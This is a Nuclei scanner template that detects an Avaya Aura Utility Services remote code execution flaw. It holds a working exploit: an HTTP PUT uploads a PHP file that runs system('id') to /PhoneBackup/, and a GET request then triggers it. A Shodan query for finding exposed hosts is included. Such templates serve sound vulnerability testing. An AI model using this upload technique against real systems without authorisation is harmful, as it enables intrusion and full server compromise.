id: avaya-aura-rce
info:
  name: Avaya Aura Utility Services Administration - Remote Code Execution
  author: DhiyaneshDk
  severity: critical
  description: The Avaya Aura Utility Services Administration system can be compromised
    remotely allowing an attacker to execute malware, obtain sensitive information,
    modify data, and gain full control over the system.
  reference:
  - https://blog.assetnote.io/2023/02/01/rce-in-avaya-aura/
  - https://download.avaya.com/css/public/documents/101076366
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-94
  metadata:
    verified: 'true'
    shodan-query: html:"Avaya Aura"
    impact: The vulnerability in Avaya Aura Utility Services Administration can have
      a severe impact by allowing attackers to remotely execute code and gain unauthorized
      access to sensitive information and systems.
    recommendation: I recommend taking immediate action to patch and secure the Avaya
      Aura Utility Services Administration to prevent potential remote code execution
      and protect sensitive information.
  tags: rce,avaya,aura,iot
requests:
- raw:
  - 'PUT /PhoneBackup/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: AVAYA

    Connection: close


    <?php system(''id'');

    '
  - 'GET /PhoneBackup/{{randstr}}.php HTTP/1.1

    Host: {{Hostname}}

    User-Agent: AVAYA

    Connection: close

    '
  matchers-condition: and
  matchers:
  - type: regex
    part: body_2
    regex:
    - uid=\d+\(([^)]+)\) gid=\d+\(([^)]+)\)
  - type: word
    part: header_2
    words:
    - text/html
